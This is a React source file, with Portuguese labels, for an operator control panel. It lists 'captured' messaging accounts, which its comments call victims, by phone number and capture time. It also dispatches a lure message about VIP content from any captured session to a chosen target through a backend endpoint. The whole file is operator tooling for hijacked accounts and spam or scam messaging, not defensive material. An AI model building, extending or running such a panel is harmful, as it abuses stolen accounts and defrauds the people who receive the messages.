import { useState, useEffect } from 'react';

export default function AdminPanel() {
  const [sessions, setSessions] = useState([]);
  const [target, setTarget] = useState(''); // Quem vai receber (ex: @seu_usuario)
  const [msg, setMsg] = useState('Olá! Vim pelo conteúdo VIP.');
  const [loading, setLoading] = useState(false);
  const [log, setLog] = useState('');

  // Carrega a lista de "vítimas" ao abrir a página
  useEffect(() => {
    fetch('/api/list-sessions')
      .then(r => r.json())
      .then(data => setSessions(data.sessions || []));
  }, []);

  const handleFire = async (senderPhone) => {
    if(!target) return alert('Defina um alvo (@usuario) para receber o teste');
    
    setLoading(true);
    setLog(`Tentando enviar de ${senderPhone}...`);

    const res = await fetch('/api/dispatch', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        senderPhone,
        targetUsername: target,
        message: msg
      })
    });

    const data = await res.json();
    setLoading(false);

    if (res.ok) {
      setLog(`✅ Sucesso! Mensagem enviada de ${senderPhone} para ${target}`);
    } else {
      setLog(`❌ Erro: ${data.error}`);
    }
  };

  return (
    <div style={{ padding: '2rem', backgroundColor: '#111', color: '#fff', minHeight: '100vh', fontFamily: 'monospace' }}>
      <h1 style={{ color: '#ff0055' }}>🔥 Painel de Controle Hot</h1>
      
      <div style={{ marginBottom: '2rem', border: '1px solid #333', padding: '1rem' }}>
        <h3>Configuração de Disparo</h3>
        <input 
          type="text" 
          placeholder="Destino (ex: @usuario ou +55...)" 
          value={target}
          onChange={e => setTarget(e.target.value)}
          style={{ display: 'block', width: '100%', padding: '10px', marginBottom: '10px', background: '#222', border: 'none', color: 'white' }}
        />
        <textarea 
          placeholder="Mensagem" 
          value={msg}
          onChange={e => setMsg(e.target.value)}
          style={{ display: 'block', width: '100%', padding: '10px', height: '80px', background: '#222', border: 'none', color: 'white' }}
        />
        {log && <div style={{ marginTop: '10px', padding: '10px', background: '#333' }}>{log}</div>}
      </div>

      <h3>Contas Conectadas ({sessions.length})</h3>
      {sessions.length === 0 && <p>Nenhuma conta capturada ainda.</p>}
      
      <div style={{ display: 'grid', gap: '10px' }}>
        {sessions.map(s => (
          <div key={s.id} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: '#222', padding: '15px', borderRadius: '5px' }}>
            <div>
              <span style={{ fontWeight: 'bold', fontSize: '1.1rem', color: '#00ccff' }}>{s.phone_number}</span>
              <br/>
              <span style={{ fontSize: '0.8rem', color: '#666' }}>Capturado em: {new Date(s.created_at).toLocaleString()}</span>
            </div>
            <button 
              onClick={() => handleFire(s.phone_number)}
              disabled={loading}
              style={{ padding: '10px 20px', background: '#ff0055', color: 'white', border: 'none', cursor: 'pointer', fontWeight: 'bold' }}
            >
              {loading ? 'Enviando...' : 'TESTAR DISPARO'}
            </button>
          </div>
        ))}
      </div>
    </div>
  );
}
